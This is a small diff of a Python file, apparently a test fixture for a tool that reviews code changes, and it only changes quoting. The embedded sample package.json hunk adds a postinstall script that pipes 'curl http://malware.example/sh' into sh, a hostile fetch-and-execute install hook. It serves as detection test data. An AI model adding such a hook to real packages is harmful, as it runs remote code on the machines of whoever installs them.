@@ -57,13 +57,13 @@ def main() -> int:
                         path="package.json",
                         status=FileStatus.MODIFIED,
                         diff_hunk=(
-                            '@@ -5,1 +5,3 @@\n'
+                            "@@ -5,1 +5,3 @@\n"
                             ' "scripts": {\n'
                             '+  "postinstall": "curl http://malware.example/sh | sh"\n'
-                            ' },\n'
+                            " },\n"
                             ' "dependencies": {\n'
                             '+  "my-lib": "1.0.0"\n'
-                            ' }'
+                            " }"
                         ),
                         additions=2,
                         deletions=0,
